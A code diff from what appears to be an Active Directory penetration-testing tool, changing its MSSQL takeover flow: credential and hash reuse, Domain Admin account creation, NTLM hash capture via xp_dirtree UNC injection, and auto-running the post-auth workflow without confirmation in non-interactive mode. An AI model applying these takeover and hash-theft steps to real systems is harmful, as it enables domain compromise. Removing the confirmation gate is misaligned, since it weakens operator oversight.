     # Reuse the credential we already hold for this user (password or hash) —
     # never prompt for or generate one.
     domains_data = getattr(shell, "domains_data", None) or {}
-    stored_creds = ((domains_data.get(domain) or {}).get("credentials") or {})
+    stored_creds = (domains_data.get(domain) or {}).get("credentials") or {}
     secret = stored_creds.get(selected_user)
     if secret is None:
         # Case-insensitive fallback lookup.
@@ -2899,6 +5142,7 @@ def _select_takeover_da_target(
             already_member = bool(probe)
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
+        print_exception(exception=exc)
         already_member = True
 
     return False, str(selected_user), str(secret), already_member
@@ -2944,7 +5188,26 @@ def run_mssql_takeover(
     _kdc_host = resolve_dc_ip(
         (getattr(shell, "domains_data", None) or {}).get(domain) or {}
     )
-    backend = ImpacketMSSQLBackend(host=host, domain=domain, kdc_host=_kdc_host)
+    # Kerberos-first, posture-aware NTLM fallback (SSOT) — sticky on the backend
+    # so an SPN-less instance still self-heals over NTLM. No-op for a plain
+    # password / NT hash or when NTLM is known-blocked by posture.
+    from adscan_internal.services.mssql_auth import (
+        resolve_mssql_ntlm_fallback_secret,
+    )
+
+    _ntlm_fallback_secret = resolve_mssql_ntlm_fallback_secret(
+        shell,
+        domain=domain,
+        username=username,
+        wire_secret=password,
+        password=password,
+    )
+    backend = ImpacketMSSQLBackend(
+        host=host,
+        domain=domain,
+        kdc_host=_kdc_host,
+        ntlm_fallback_secret=_ntlm_fallback_secret,
+    )
 
     # Domain-Controller detection — computed UP FRONT so the escalation-mode
     # choice and the identity prompt below can depend on it. When the SQL host
@@ -2993,7 +5256,9 @@ def run_mssql_takeover(
             if create_new:
                 # Let the operator review/override the minted identity.
                 admin_username, admin_password = _prompt_minted_account_identity(
-                    shell, default_username=admin_username, default_password=admin_password
+                    shell,
+                    default_username=admin_username,
+                    default_password=admin_password,
                 )
         else:
             # Member server: create-new only (no Domain Admins promotion path).
@@ -3079,6 +5344,7 @@ def run_mssql_takeover(
                 )
             except Exception as exc:  # noqa: BLE001
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
         # Hand the credential to the NORMAL credential pipeline via
         # add_credential — never the registry-dump follow-up. add_credential
         # stores the credential and runs the right follow-ups itself:
@@ -3153,11 +5419,25 @@ def ask_for_mssql_access(
         return
     marked_host = mark_sensitive(host, "hostname")
     marked_user = mark_sensitive(username, "user")
-    if Confirm.ask(
-        "Do you want to run the MSSQL post-auth workflow on "
-        f"{marked_host} with {marked_user}?",
-        default=False,
-    ):
+    if is_non_interactive(shell):
+        # Money-path pivot: in an autonomous engagement (adscan ci / web-PoV) the
+        # MSSQL post-auth workflow auto-RUNS, mirroring the poisoning auto-launch
+        # doctrine — the client engaged for an active pentest. Declining it by
+        # default capped ADscan at foothold whenever MSSQL is the pivot (observed
+        # on HTB Manager: operator:operator reached, then the whole
+        # xp_dirtree→backup→raven→ESC7 chain skipped because this one gate said No).
+        proceed = True
+        print_info_debug(
+            f"[mssql] Non-interactive; auto-running the MSSQL post-auth workflow "
+            f"on {host} with {username}."
+        )
+    else:
+        proceed = confirm_ask(
+            "Do you want to run the MSSQL post-auth workflow on "
+            f"{marked_host} with {marked_user}?",
+            default=True,
+        )
+    if proceed:
         run_mssql_postauth_workflow(
             shell,
             domain=domain,
@@ -3203,16 +5483,28 @@ def ask_for_mssql_steal(
     marked_host_steal = mark_sensitive(host, "hostname")
     _opsec_body = RichText.assemble(
         ("OPSEC: ", f"bold {_COLOR_AMBER}"),
-        ("This technique forces the SQL Server service account to authenticate ", _COLOR_MUTED),
-        ("to your listener via UNC path injection (xp_dirtree / xp_fileexist).\n", _COLOR_MUTED),
+        (
+            "This technique forces the SQL Server service account to authenticate ",
+            _COLOR_MUTED,
+        ),
+        (
+            "to your listener via UNC path injection (xp_dirtree / xp_fileexist).\n",
+            _COLOR_MUTED,
+        ),
         ("It generates the following Windows events on the target:\n", _COLOR_MUTED),
         ("  4624  Logon (Network, Type 3)\n", f"bold {_COLOR_STEEL}"),
-        ("  4625  Logon failure (if hash is not relayed in time)\n", f"bold {_COLOR_STEEL}"),
+        (
+            "  4625  Logon failure (if hash is not relayed in time)\n",
+            f"bold {_COLOR_STEEL}",
+        ),
         ("\nCaptures the NTLMv2 challenge-response for ", _COLOR_MUTED),
         (mark_sensitive(username, "user"), f"bold {_COLOR_STEEL}"),
         (" on ", _COLOR_MUTED),
         (marked_host_steal, f"bold {_COLOR_STEEL}"),
-        (".\nEnsure your listener (Responder/ntlmrelayx) is running before confirming.", _COLOR_MUTED),
+        (
+            ".\nEnsure your listener (Responder/ntlmrelayx) is running before confirming.",
+            _COLOR_MUTED,
+        ),
     )
     print_panel(
         _opsec_body,
